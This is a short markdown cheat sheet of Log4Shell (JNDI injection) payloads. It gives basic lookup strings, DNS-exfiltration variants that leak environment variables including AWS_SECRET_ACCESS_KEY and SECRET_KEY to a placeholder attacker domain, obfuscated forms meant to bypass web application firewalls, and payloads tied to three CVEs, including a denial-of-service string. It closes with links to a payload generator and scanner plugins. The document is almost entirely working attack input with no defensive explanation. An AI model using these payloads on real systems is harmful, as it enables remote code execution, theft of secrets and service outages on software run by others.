## Basic payload
`${jndi:ldap://example.com/a}`

## DNS Exfil
```
${jndi:ldap://${env:JAVA_VERSION}.example.com/a}
${jndi:ldap://${sys:java.version}.example.com/a}
${jndi:ldap://${hostName}.example.com/a}
${jndi:ldap://${sys:java.vendor}.example.com/a}
${jndi:ldap://${env:user}.example.com/a}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.example.com}
${jndi:ldap://example.com/a${env:USER}}
${jndi:ldap://${env:SECRET_KEY}.example.com/}
```

## Bypass WAF
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://example.com/a}
${${::-j}ndi:rmi://example.com/a}
${jndi:rmi://example.com}
${${lower:jndi}:${lower:rmi}://example.com/a}
${${lower:${lower:jndi}}:${lower:rmi}://example.com/a}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://example.com/a}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://example.com/a}
```

## Omitting closing brace can lead to data exfil after "/" sign
`${jndi:ldap://example.com/`

### CVE-2021-44228 (RCE) - Critical
`${jndi:ldap://example.com/a}`

### CVE-2021-45046 (RCE) - Critical
`${jndi:ldap://127.0.0.1#example.com/a}`

### CVE-2021-45105 (DoS) - High
`${${::-${::-$${::-j}}}}`

## Payload generator
https://github.com/woodpecker-appstore/log4j-payload-generator

## Burp plugins
### Passive scanner checks
https://github.com/whwlsfb/Log4j2Scan

### Active scan check
https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f


